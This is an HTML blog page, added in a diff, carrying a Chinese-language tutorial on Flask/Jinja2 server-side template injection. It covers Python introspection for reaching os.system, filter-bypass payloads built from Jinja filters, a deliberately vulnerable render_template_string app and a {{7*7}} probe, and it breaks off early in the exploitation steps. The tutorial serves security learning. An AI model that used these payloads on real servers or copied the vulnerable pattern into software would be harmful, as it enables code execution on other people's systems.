@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <title>
+        模板注入总结 |
+        
+        A.M.|P.M.
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
+    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+        <a class="logo-title" href="/">
+            A.M.|P.M.
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/categories"
+                    >
+                        CATEGORIES
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">模板注入总结</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span>John_Frod</span>
+                        <span class="level">Lv4</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-calendar"></i> 2021-05-06 16:55:21
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/SSTI/">SSTI</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="模板注入总结"><a href="#模板注入总结" class="headerlink" title="模板注入总结"></a>模板注入总结</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
+<br/>
+
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>服务端模板注入和常见Web注入的成因一样，也是<strong>服务端接收了用户的输入，将未过滤的数据传给引擎解析，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。</strong>其影响范围主要取决于模版引擎的复杂性。</p>
+<br/>
+
+<h3 id="判断模板类型"><a href="#判断模板类型" class="headerlink" title="判断模板类型"></a>判断模板类型</h3><p>通常测试模块类型的方式如下图：</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210426105430663.png" alt="image-20210426105430663"></p>
+<br/>
+
+<h2 id="flask模板注入"><a href="#flask模板注入" class="headerlink" title="flask模板注入"></a>flask模板注入</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>在利用flask模板注入之前我们先需要认识一些Python类的基础知识</p>
+<h4 id="常用的内建属性"><a href="#常用的内建属性" class="headerlink" title="常用的内建属性"></a>常用的内建属性</h4><h5 id="class"><a href="#class" class="headerlink" title="__class__"></a>__class__</h5><p>用于返回对象所属的类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="base"><a href="#base" class="headerlink" title="__base__"></a>__base__</h5><p>以字符串的形式返回一个类所继承的类，一般情况下是object</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="bases"><a href="#bases" class="headerlink" title="__bases__"></a>__bases__</h5><p>以元组的形式返回一个类所继承的类</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__</span><br><span class="line">(&lt;class &#x27;object&#x27;&gt;,)</span><br></pre></td></tr></table></figure>
+<h5 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a>__mro__</h5><p>返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GrandFather</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span>(<span class="params">GrandFather</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>(<span class="params">Father</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(Son.__base__)</span><br><span class="line">print(Son.__bases__)</span><br><span class="line">print(Son.__mro__)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425212439940.png" alt="image-20210425212439940"></p>
+<h5 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a>__subclasses__()</h5><p>得到object类后，就可以用<code>__subclasses__()</code>获取所有的子类：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;,......, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;]</span><br></pre></td></tr></table></figure>
+<h5 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a>__dict__</h5><p>我们在获得到一个模块时想调用模块中的方法，恰好该方法被过滤了，就可以用该方法bypass</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">laptop-vke4f570\john</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__dict__[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ystem&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">laptop-vke4f570\john</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>与dir()作用相同，都是返回属性、方法等；但一些数据类型是没有<code>__dict__</code>属性的，如<code>[].__dict__</code>会返回错误</p>
+<p><code>__dict__</code>只会显示属于自己的属性，dir()除了显示自己的属性，还显示从父类继承来的属性</p>
+<p>可以使用<code>__dict__</code>来间接调用一些属性或方法，如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=[]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__dict__[<span class="string">&#x27;append&#x27;</span>](a, <span class="string">&#x27;john&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="string">&#x27;john&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<h5 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h5><p><code>__init__</code>用于初始化类，作用就是为了得到function/method模型，意思就是拿到一个类之后要使用<code>__init__</code>之后才能调用里面的函数和属性</p>
+<h5 id="global"><a href="#global" class="headerlink" title="__global__"></a>__global__</h5><p>会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>__init__</code>使用</p>
+<p>如果该关键字被过滤了我们可以使用<code>__getattribute__</code>，以下两者等效</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">__init__.__getattribute__(<span class="string">&#x27;__global&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>)[<span class="string">&#x27;sys&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<h5 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__"></a>__getitem__</h5><p>如果想调用字典中的键值，其本质其实是调用了魔术方法<code>__getitem__</code>，<strong>所以对于取字典中键值的情况不仅可以用<code>[]</code>，也可以用<code>__getitem__</code></strong></p>
+<p>当然对于字典来说，我们也可以用他自带的一些方法了。pop就是其中的一个</p>
+<h4 id="builtins、-builtin-、-builtins-的区别"><a href="#builtins、-builtin-、-builtins-的区别" class="headerlink" title="builtins、__builtin__、__builtins__的区别"></a>builtins、__builtin__、__builtins__的区别</h4><p>在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫内建模块（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。</p>
+<p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p>
+<p>python2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
+<p>python3</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> builtins</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtins</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
+<p>而<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">laptop-vke4f570\john</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;execfile&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
+<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多 个过滤器。一个过滤器的输出应用于下一个过滤器。</p>
+<h5 id="attr"><a href="#attr" class="headerlink" title="attr"></a>attr</h5><p>attr用于获取变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__&quot;) </span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;.__class__</span><br></pre></td></tr></table></figure>
+<p>这个大家应该见的比较多了，常见于点号<code>.</code>被过滤，或者点号<code>.</code>和中括号<code>[]</code>都被过滤的情况。</p>
+<h5 id="format"><a href="#format" class="headerlink" title="format"></a>format</h5><p>占位符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)&#x3D;&#x3D;&#39;__class__&#39;</span><br><span class="line">&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]</span><br></pre></td></tr></table></figure>
+<h5 id="first-last-random"><a href="#first-last-random" class="headerlink" title="first last random"></a>first last random</h5><p>常用于数字被过滤后想选择最后一个内容，用处不是很多</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__|last()</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1]</span><br></pre></td></tr></table></figure>
+<h5 id="join"><a href="#join" class="headerlink" title="join"></a>join</h5><p>将传入的内容拼接返回字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;[[&#39;__clas&#39;,&#39;s__&#39;]|join] 或者 &quot;&quot;[(&#39;__clas&#39;,&#39;s__&#39;)|join]</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;[&quot;__class__&quot;]</span><br></pre></td></tr></table></figure>
+<h5 id="lower"><a href="#lower" class="headerlink" title="lower"></a>lower</h5><p>转换为小写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;[&quot;__CLASS__&quot;|lower]</span><br></pre></td></tr></table></figure>
+<h5 id="replace-reverse"><a href="#replace-reverse" class="headerlink" title="replace reverse"></a>replace reverse</h5><p>替换和反转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;</span><br><span class="line">&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;</span><br></pre></td></tr></table></figure>
+<h5 id="string"><a href="#string" class="headerlink" title="string"></a>string</h5><p>功能类似于python内置函数 str<br>有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__   出来的是&lt;class &#39;tuple&#39;&gt;</span><br><span class="line">(().__class__|string)[0] 出来的是&lt;</span><br></pre></td></tr></table></figure>
+<h5 id="select-unique"><a href="#select-unique" class="headerlink" title="select unique"></a>select unique</h5><p>通过对每个对象应用测试并仅选择测试成功的对象来筛选对象序列。 如果没有指定测试，则每个对象都将被计算为布尔值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">()|select|string</span><br><span class="line">结果如下</span><br><span class="line">&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;</span><br></pre></td></tr></table></figure>
+<p>通过配合上面的string来拼接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[15]~</span><br><span class="line">(()|select|string)[20]~</span><br><span class="line">(()|select|string)[6]~</span><br><span class="line">(()|select|string)[18]~</span><br><span class="line">(()|select|string)[18]~</span><br><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[24]</span><br><span class="line"></span><br><span class="line">得到字符串&quot;__class__&quot;</span><br></pre></td></tr></table></figure>
+<h5 id="list"><a href="#list" class="headerlink" title="list"></a>list</h5><p>转换成列表<br>更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(()|select|string|list).pop(0)</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>首先安装<code>flask</code>模组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask</span><br></pre></td></tr></table></figure>
+<p>在试了几个网上的模板都没用之后发现这个可以用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;Hello %s&quot;</span> % name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>运行之后访问本地的5000端口即可</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425205405258.png" alt="image-20210425205405258"></p>
+<h4 id="route装饰器路由"><a href="#route装饰器路由" class="headerlink" title="route装饰器路由"></a>route装饰器路由</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br></pre></td></tr></table></figure>
+<p>使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p>访问127.0.0.1:5000/则会输出123，我们修改一下规则</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p>这个时候访问127.0.0.1:5000/test会输出123.</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425210217680.png" alt="image-20210425210217680"></p>
+<p>此外还可以设置动态网址，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hello/&lt;username&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_user</span>(<span class="params">username</span>):</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;user : %s&quot;</span>%username</span><br></pre></td></tr></table></figure>
+<p>根据url里的输入，动态辨别身份，此时便可以看到如下页面：</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425205956011.png" alt="image-20210425205956011"></p>
+<p>或者可以使用int型，转换器有下面几种：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>    接受整数</span><br><span class="line"><span class="built_in">float</span>    同 <span class="built_in">int</span> ，但是接受浮点数</span><br><span class="line">path    和默认的相似，但也接受斜线</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/post/&lt;int:post_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_post</span>(<span class="params">post_id</span>):</span></span><br><span class="line">    <span class="comment"># show the post with the given id, the id is an integer</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Post %d&#x27;</span> % post_id</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425210402292.png"></p>
+<h4 id="debug模式"><a href="#debug模式" class="headerlink" title="debug模式"></a>debug模式</h4><p>测试的时候，我们可以使用debug，方便调试，增加一句</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。</p>
+<h4 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h4><p>使用<code>render_template()</code>或<code>render_template_string()</code>方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(<span class="string">&quot;Hello %s&quot;</span> % name)</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h3 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h3><p>在注入处输入<code>&#123;&#123;7*7&#125;&#125;</code>来测试后端是否会对输入的内容执行</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210426103946200.png" alt="image-20210426103946200"></p>
+<p>根据返回结果判断是否存在注入漏洞</p>
+<br/>
+
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>使用<code>__class__</code>来获取内置类所对应的类，可以使用<code>str</code>，<code>dict</code>，<code>tuple</code>，<code>list</code>等来获取。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210425220826467.png" alt="image-20210425220826467"></p>
+<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>拿到<code>object</code>基类</p>
+<ul>
+<li>用<code>__base__</code>拿到基类：</li>
+</ul>
